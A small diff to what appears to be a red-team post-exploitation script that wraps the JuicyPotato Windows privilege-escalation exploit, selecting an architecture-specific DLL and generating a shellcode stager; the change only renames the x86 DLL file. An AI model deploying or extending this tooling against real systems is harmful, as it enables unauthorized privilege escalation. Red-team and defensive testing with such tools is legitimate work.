@@ -7,7 +7,7 @@ sub juicypotato {
         $dll = "JuicyPotato.x64.dll";
     } else {
         $arch = "x86";
-        $dll = "JuicyPotato.x86.dll";
+        $dll = "JuicyPotato.x32.dll";
     }
 
     $stager = shellcode($2, false, $arch);
